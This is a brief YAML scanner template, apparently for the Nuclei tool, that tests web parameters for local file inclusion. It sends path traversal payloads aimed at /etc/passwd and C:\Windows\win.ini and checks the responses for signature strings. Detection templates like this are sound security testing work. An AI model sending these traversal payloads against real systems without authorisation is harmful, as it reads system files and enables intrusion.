id: lfi-detection
info:
  name: Local File Inclusion (LFI) Detection
  author: FerzDevZ
  severity: critical
  description: Detects LFI by trying to read /etc/passwd or C:\Windows\win.ini.
requests:
  - method: GET
    path:
      - "?file=../../../../../../etc/passwd"
      - "?path=../../../../../../etc/passwd"
      - "?include=../../../../../../etc/passwd"
      - "?f=../../../../../../etc/passwd"
      - "?file=C:\\Windows\\win.ini"
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - "root:x:0:0:"
          - "[extensions]"
          - "for 16-bit app support"
